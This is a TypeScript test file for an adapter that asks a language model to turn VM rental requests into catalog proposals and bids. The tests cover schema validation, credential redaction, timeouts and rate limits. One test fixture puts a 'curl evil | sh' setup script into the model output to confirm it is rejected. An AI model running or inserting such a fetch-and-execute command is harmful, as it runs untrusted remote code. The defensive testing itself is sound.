import { describe, expect, it, vi } from 'vitest';
import { createMuseAdapter, MUSE_MODEL, redactMuseText } from '../src/server/integrations/muse.js';
import type { CatalogItem, SupplierPolicy } from '../src/shared/types.js';

const catalog: CatalogItem[] = [
  {
    id: 'small',
    name: 'Small Linux',
    description: 'Approved Linux VM',
    provider: 'demo',
    profile: 'small',
    region: 'us-east',
    cpu: 2,
    memoryGb: 4,
    durationMinutes: [15, 30, 60],
    approved: true,
    organizationId: 'private-organization',
    groupId: 'private-group',
  },
  {
    id: 'large',
    name: 'Large Linux',
    description: 'Approved Linux VM',
    provider: 'demo',
    profile: 'large',
    region: 'us-east',
    cpu: 8,
    memoryGb: 16,
    durationMinutes: [30, 60],
    approved: true,
  },
  {
    id: 'gpu',
    name: 'GPU Linux',
    description: 'Approved GPU VM',
    provider: 'demo',
    profile: 'gpu',
    region: 'eu-west',
    cpu: 8,
    memoryGb: 32,
    gpu: 'NVIDIA A100',
    durationMinutes: [30],
    approved: true,
  },
  {
    id: 'unapproved',
    name: 'Unapproved',
    description: 'Do not use',
    provider: 'demo',
    profile: 'private',
    region: 'us-east',
    cpu: 64,
    memoryGb: 256,
    durationMinutes: [30],
    approved: false,
  },
];
const supplierPolicy: SupplierPolicy = {
  autoBid: true,
  minimumPriceCents: 40,
  basePriceCents: 65,
  maxPriceCents: 100,
  allowedCatalogIds: ['small', 'large'],
};
const bidInput = () => ({
  request: {
    description: '2 CPU Linux environment',
    catalogId: 'small',
    region: 'us-east',
    durationMinutes: 30,
    maxPriceCents: 90,
    requirements: { cpu: 2, memoryGb: 4 },
  },
  policy: supplierPolicy,
  availableCapacity: 2,
  catalog,
});
const translateOutput = {
  catalogId: 'small',
  region: 'us-east',
  durationMinutes: 30,
  requirements: { cpu: 2, memoryGb: 4, gpu: null },
};
function completion(value: unknown, extra: Record<string, unknown> = {}) {
  return new Response(
    JSON.stringify({
      choices: [{ finish_reason: 'stop', message: { content: JSON.stringify(value) }, ...extra }],
    }),
    { status: 200, headers: { 'Content-Type': 'application/json' } },
  );
}
function realAdapter(value: unknown) {
  const fetcher = vi.fn<typeof fetch>().mockResolvedValue(completion(value));
  return {
    fetcher,
    adapter: createMuseAdapter(
      { museMode: 'real', metaApiKey: 'test-server-secret' },
      { fetch: fetcher },
    ),
  };
}

describe('explicit Muse fixture mode', () => {
  const fixture = createMuseAdapter({ museMode: 'fixture' });
  it('defaults to 30 minutes and visibly identifies deterministic fixture output', async () => {
    const result = await fixture.translate('A Linux environment', catalog);
    expect(result.proposal).toMatchObject({ catalogId: 'small', durationMinutes: 30 });
    expect(result.mode).toBe('fixture');
    expect(result.receipt.constraints.join(' ')).toContain('no Meta model call was made');
    expect(result.receipt.decision).toContain('Review');
  });
  it('matches explicit resources, region and supported exact duration', async () => {
    const result = await fixture.translate(
      '8 CPUs and 16 GB RAM for 60 minutes in us-east',
      catalog,
    );
    expect(result.proposal).toEqual({
      catalogId: 'large',
      region: 'us-east',
      durationMinutes: 60,
      requirements: { cpu: 8, memoryGb: 16 },
    });
  });
  it('does not silently substitute durations, unapproved supply or unsupported GPUs', async () => {
    await expect(fixture.translate('Linux for 2 hours', catalog)).rejects.toMatchObject({
      code: 'unsupported',
    });
    await expect(fixture.translate('64 CPUs and 128 GB RAM', catalog)).rejects.toMatchObject({
      code: 'unsupported',
    });
    await expect(fixture.translate('An H100 GPU for 30 minutes', catalog)).rejects.toMatchObject({
      code: 'unsupported',
    });
    await expect(fixture.translate('An A100 GPU for 15 minutes', catalog)).rejects.toMatchObject({
      code: 'unsupported',
    });
  });
  it('canonicalizes GPU aliases to the exact approved catalog label for request submission', async () => {
    const proposal = (await fixture.translate('An A100 GPU for 30 minutes', catalog)).proposal;
    expect(proposal.requirements.gpu).toBe('NVIDIA A100');
    expect(proposal.catalogId).toBe('gpu');
  });
  it('returns a fixed total quote and declines exhausted capacity', async () => {
    expect(await fixture.proposeBid(bidInput())).toMatchObject({
      decision: 'bid',
      catalogId: 'small',
      totalPriceCents: 65,
      modelCalled: false,
    });
    expect(await fixture.proposeBid({ ...bidInput(), availableCapacity: 0 })).toMatchObject({
      decision: 'decline',
    });
  });
  it('checks budget, region and supplier catalog restrictions before proposing', async () => {
    expect(
      (
        await fixture.proposeBid({
          ...bidInput(),
          request: { ...bidInput().request, maxPriceCents: 39 },
        })
      ).decision,
    ).toBe('decline');
    expect(
      (
        await fixture.proposeBid({
          ...bidInput(),
          request: { ...bidInput().request, region: 'wrong-region' },
        })
      ).decision,
    ).toBe('decline');
    expect(
      (
        await fixture.proposeBid({
          ...bidInput(),
          policy: { ...supplierPolicy, allowedCatalogIds: [] },
        })
      ).decision,
    ).toBe('decline');
  });
  it('requires recorded demand and offers only approved matching configurations', async () => {
    expect(
      (await fixture.proposeOfferings({ demand: [], catalog, policy: supplierPolicy })).proposals,
    ).toEqual([]);
    const result = await fixture.proposeOfferings({
      demand: [
        {
          region: 'us-east',
          durationMinutes: 60,
          requirements: { cpu: 8, memoryGb: 16 },
          count: 3,
        },
      ],
      catalog,
      policy: supplierPolicy,
    });
    expect(result.proposals.map((item) => item.catalogId)).toEqual(['large']);
    expect(result.receipt.constraints).toContain('Suggestions are not published automatically.');
    expect(result.receipt.observed[0]).toContain('3 recorded unmatched requests');
  });
});

describe('real Meta structured-output contract', () => {
  it('validates fractional GiB model output and declares numeric memory in the offline schema contract', async () => {
    const memoryGb = 3814 / 1024;
    const boat = { ...catalog[0]!, memoryGb };
    const { fetcher, adapter } = realAdapter({
      ...translateOutput,
      requirements: { cpu: 2, memoryGb, gpu: null },
    });
    const result = await adapter.translate('2 CPU and 3.724609375 GiB RAM', [boat]);
    expect(result.proposal.requirements.memoryGb).toBe(memoryGb);
    const sent = JSON.parse(fetcher.mock.calls[0]![1]!.body as string);
    expect(
      sent.response_format.json_schema.schema.properties.requirements.properties.memoryGb,
    ).toEqual({ type: 'number', exclusiveMinimum: 0, maximum: 16384 });
    const tooLarge = realAdapter(translateOutput).adapter;
    await expect(tooLarge.translate('4 GiB RAM', [boat])).rejects.toThrow('cannot satisfy');
  });
  it('uses the documented endpoint, exact model and strict JSON schema', async () => {
    const { fetcher, adapter } = realAdapter(translateOutput);
    const result = await adapter.translate('2 CPUs with 4 GB RAM', catalog);
    const [url, request] = fetcher.mock.calls[0]!;
    const body = JSON.parse(request!.body as string);
    expect(String(url)).toBe('https://api.meta.ai/v1/chat/completions');
    expect(request!.headers).toMatchObject({ Authorization: 'Bearer test-server-secret' });
    expect(request!.redirect).toBe('error');
    expect(body.model).toBe(MUSE_MODEL);
    expect(body.response_format).toMatchObject({
      type: 'json_schema',
      json_schema: {
        strict: true,
        name: 'wick_environment_translation',
        schema: { additionalProperties: false },
      },
    });
    expect(body.messages).toHaveLength(2);
    expect(body.max_completion_tokens).toBe(1600);
    expect(body.reasoning_effort).toBe('low');
    expect(result.mode).toBe('real');
    expect(result.proposal.requirements).toEqual({ cpu: 2, memoryGb: 4 });
    expect(fetcher).toHaveBeenCalledTimes(1);
    expect(JSON.stringify(body)).not.toContain('test-server-secret');
    expect(JSON.stringify(body)).not.toContain('private-organization');
    expect(JSON.stringify(body)).not.toContain('private-group');
    expect(JSON.stringify(body)).not.toContain('unapproved');
  });
  it('redacts common pasted credentials from description before transmission and receipts', async () => {
    const { fetcher, adapter } = realAdapter(translateOutput);
    const result = await adapter.translate(
      'Linux password=hunter-secret api_key="api-secret" Bearer abc.def.xyz',
      catalog,
    );
    const body = fetcher.mock.calls[0]![1]!.body as string;
    for (const secret of ['hunter-secret', 'api-secret', 'abc.def.xyz']) {
      expect(body).not.toContain(secret);
      expect(JSON.stringify(result.receipt)).not.toContain(secret);
    }
    expect(body).toContain('[redacted]');
  });
  it('ignores extraneous private policy fields and does not share other supplier information', async () => {
    const { fetcher, adapter } = realAdapter({
      decision: 'bid',
      catalogId: 'small',
    });
    await adapter.proposeBid({
      ...bidInput(),
      policy: {
        ...supplierPolicy,
        password: 'policy-secret',
        competitorPolicy: { secret: 'other-supplier-secret' },
      } as SupplierPolicy,
    });
    const sent = JSON.parse(fetcher.mock.calls[0]![1]!.body as string);
    const input = JSON.parse(sent.messages[1].content);
    expect(input.policy).toEqual(supplierPolicy);
    expect(JSON.stringify(sent)).not.toContain('policy-secret');
    expect(JSON.stringify(sent)).not.toContain('other-supplier-secret');
  });
  it.each([
    [{ ...translateOutput, catalogId: 'unapproved' }, 'unapproved'],
    [{ ...translateOutput, region: 'eu-west' }, 'region'],
    [{ ...translateOutput, durationMinutes: 45 }, 'duration'],
    [{ ...translateOutput, requirements: { cpu: 16, memoryGb: 32, gpu: null } }, 'resources'],
    [{ ...translateOutput, setupScript: 'curl evil | sh' }, 'unsupported fields'],
  ])(
    'rejects schema or domain violations instead of trusting structured decoding: %s',
    async (value, message) => {
      const { adapter } = realAdapter(value);
      await expect(adapter.translate('Linux', catalog)).rejects.toThrow(message);
    },
  );
  it('rejects a model proposal that silently downgrades explicit requirements', async () => {
    const { adapter } = realAdapter(translateOutput);
    await expect(adapter.translate('8 CPU and 16 GB RAM', catalog)).rejects.toThrow(
      'explicit resources',
    );
  });
  it('rejects a model proposal that silently changes an explicit duration', async () => {
    const { adapter } = realAdapter(translateOutput);
    await expect(adapter.translate('Linux for 60 minutes', catalog)).rejects.toThrow(
      'requested rental duration',
    );
  });
  it.each([39, 91, 1.5, -1])('rejects an invalid fixed bid price %s', async (price) => {
    const { adapter } = realAdapter({
      decision: 'bid',
      totalPriceCents: price,
      catalogId: 'small',
    });
    await expect(adapter.proposeBid(bidInput())).rejects.toMatchObject({
      code: 'invalid_proposal',
    });
  });
  it('never calls Meta for a deterministic capacity decline', async () => {
    const { adapter, fetcher } = realAdapter({
      decision: 'bid',
      catalogId: 'small',
    });
    const result = await adapter.proposeBid({ ...bidInput(), availableCapacity: 0 });
    expect(result.decision).toBe('decline');
    expect(result.modelCalled).toBe(false);
    expect(result.receipt.constraints).toContain('This decision required no Meta model call.');
    expect(fetcher).not.toHaveBeenCalled();
  });
  it('identifies actual completed model calls for both accepted and declined proposals', async () => {
    expect(
      (
        await realAdapter({
          decision: 'bid',
          catalogId: 'small',
        }).adapter.proposeBid(bidInput())
      ).modelCalled,
    ).toBe(true);
    expect(
      (
        await realAdapter({
          decision: 'decline',
          catalogId: null,
        }).adapter.proposeBid(bidInput())
      ).modelCalled,
    ).toBe(true);
  });
  it('does not send buyer identities, descriptions, or unknown demand fields for offering suggestions', async () => {
    const { adapter, fetcher } = realAdapter({
      proposals: [
        {
          candidateId: 'large:60',
          name: 'Larger environment',
          description: 'Existing approved larger configuration.',
        },
      ],
    });
    await adapter.proposeOfferings({
      demand: [
        {
          region: 'us-east',
          durationMinutes: 60,
          requirements: { cpu: 8, memoryGb: 16 },
          count: 5,
          buyerId: 'buyer-private',
          description: 'private-free-text',
        },
      ],
      catalog,
      policy: supplierPolicy,
    });
    const body = fetcher.mock.calls[0]![1]!.body as string;
    expect(body).not.toContain('buyer-private');
    expect(body).not.toContain('private-free-text');
  });
  it('rejects offering suggestions unrelated to recorded unmatched demand', async () => {
    const { adapter } = realAdapter({
      proposals: [
        {
          candidateId: 'small:60',
          name: 'Too small',
          description: 'Existing but insufficient configuration.',
        },
      ],
    });
    await expect(
      adapter.proposeOfferings({
        demand: [
          { region: 'us-east', durationMinutes: 60, requirements: { cpu: 8, memoryGb: 16 } },
        ],
        catalog,
        policy: supplierPolicy,
      }),
    ).rejects.toThrow('unmatched configuration');
  });
  it('rejects generated setup fields and duplicate offerings', async () => {
    const suggestion = {
      candidateId: 'large:60',
      name: 'Larger environment',
      description: 'Approved.',
    };
    const input = {
      demand: [{ region: 'us-east', durationMinutes: 60, requirements: { cpu: 8, memoryGb: 16 } }],
      catalog,
      policy: supplierPolicy,
    };
    await expect(
      realAdapter({
        proposals: [{ ...suggestion, setupCode: 'do something' }],
      }).adapter.proposeOfferings(input),
    ).rejects.toThrow('unsupported fields');
    await expect(
      realAdapter({ proposals: [suggestion, suggestion] }).adapter.proposeOfferings(input),
    ).rejects.toThrow('duplicate');
  });
});

describe('bounded failures without fixture fallback', () => {
  it('requires explicit mode and credentials for real mode', () => {
    expect(() => createMuseAdapter({ museMode: undefined as never })).toThrow('explicitly');
    expect(() => createMuseAdapter({ museMode: 'real' })).toThrow('META_API_KEY');
    expect(() =>
      createMuseAdapter({
        museMode: 'real',
        metaApiKey: 'x',
        metaApiBase: 'http://untrusted.example/v1',
      }),
    ).toThrow('HTTPS');
  });
  it('surfaces rate limit errors safely and never retries', async () => {
    const fetcher = vi
      .fn<typeof fetch>()
      .mockResolvedValue(
        new Response('sensitive upstream diagnostic token=private', { status: 429 }),
      );
    const adapter = createMuseAdapter(
      { museMode: 'real', metaApiKey: 'secret' },
      { fetch: fetcher },
    );
    await expect(adapter.translate('Linux', catalog)).rejects.toMatchObject({
      statusCode: 429,
      code: 'upstream_error',
      message: 'Muse request failed (HTTP 429). Manual controls remain available.',
    });
    expect(fetcher).toHaveBeenCalledTimes(1);
  });
  it('bounds wall-clock time and aborts a stalled upstream call', async () => {
    let signal: AbortSignal | undefined;
    const fetcher = vi.fn<typeof fetch>().mockImplementation(async (_url, init) => {
      signal = init?.signal as AbortSignal;
      return new Promise(() => {});
    });
    const adapter = createMuseAdapter(
      { museMode: 'real', metaApiKey: 'secret' },
      { fetch: fetcher, timeoutMs: 10 },
    );
    await expect(adapter.translate('Linux', catalog)).rejects.toMatchObject({
      statusCode: 504,
      code: 'timeout',
    });
    expect(signal?.aborted).toBe(true);
    expect(fetcher).toHaveBeenCalledTimes(1);
  });
  it('bounds concurrent calls without queuing more paid work', async () => {
    let finish: (response: Response) => void = () => {};
    const fetcher = vi.fn<typeof fetch>().mockImplementation(
      () =>
        new Promise<Response>((resolve) => {
          finish = resolve;
        }),
    );
    const adapter = createMuseAdapter(
      { museMode: 'real', metaApiKey: 'secret' },
      { fetch: fetcher, maxConcurrent: 1 },
    );
    const first = adapter.translate('Linux', catalog);
    await expect(adapter.translate('Linux', catalog)).rejects.toMatchObject({
      statusCode: 429,
      code: 'busy',
    });
    finish(completion(translateOutput));
    await expect(first).resolves.toMatchObject({ mode: 'real' });
    expect(fetcher).toHaveBeenCalledTimes(1);
  });
  it('rejects truncated completions, refusals, malformed JSON and oversized envelopes', async () => {
    const responses = [
      completion(translateOutput, { finish_reason: 'length' }),
      completion(translateOutput, { finish_reason: undefined }),
      completion(translateOutput, { message: { refusal: 'refused', content: null } }),
      new Response('{invalid json'),
      new Response('x'.repeat(65_537)),
    ];
    for (const response of responses) {
      const fetcher = vi.fn<typeof fetch>().mockResolvedValue(response);
      const adapter = createMuseAdapter(
        { museMode: 'real', metaApiKey: 'secret' },
        { fetch: fetcher },
      );
      await expect(adapter.translate('Linux', catalog)).rejects.toMatchObject({ statusCode: 502 });
      expect(fetcher).toHaveBeenCalledTimes(1);
    }
  });
  it('does not include low-level network diagnostics in user-facing errors', async () => {
    const fetcher = vi
      .fn<typeof fetch>()
      .mockRejectedValue(new Error('request headers Authorization: Bearer sensitive-secret'));
    const adapter = createMuseAdapter(
      { museMode: 'real', metaApiKey: 'secret' },
      { fetch: fetcher },
    );
    await expect(adapter.translate('Linux', catalog)).rejects.toMatchObject({
      code: 'unavailable',
      message: 'Muse is unavailable. Manual controls remain available.',
    });
  });
});

describe('credential redaction', () => {
  it('removes private keys, basic auth, named tokens and credential-bearing URLs', () => {
    const result = redactMuseText(
      '-----BEGIN PRIVATE KEY-----\nprivate-pem\n-----END PRIVATE KEY----- Basic dXNlcjpwYXNz refresh_token=private-token https://user:password@example.com/x',
    );
    for (const secret of ['private-pem', 'dXNlcjpwYXNz', 'private-token', 'user:password'])
      expect(result).not.toContain(secret);
  });
  it('redacts JSON credentials, prefixed environment variables and incomplete private keys', () => {
    const result = redactMuseText(
      '{"password":"json-secret","token":"opaque-token"} META_API_KEY=meta-secret WICK_API_KEY=wick-secret OAUTH_CLIENT_SECRET=oauth-secret -----BEGIN PRIVATE KEY-----\nunfinished-pem',
    );
    for (const secret of [
      'json-secret',
      'opaque-token',
      'meta-secret',
      'wick-secret',
      'oauth-secret',
      'unfinished-pem',
    ])
      expect(result).not.toContain(secret);
  });
});
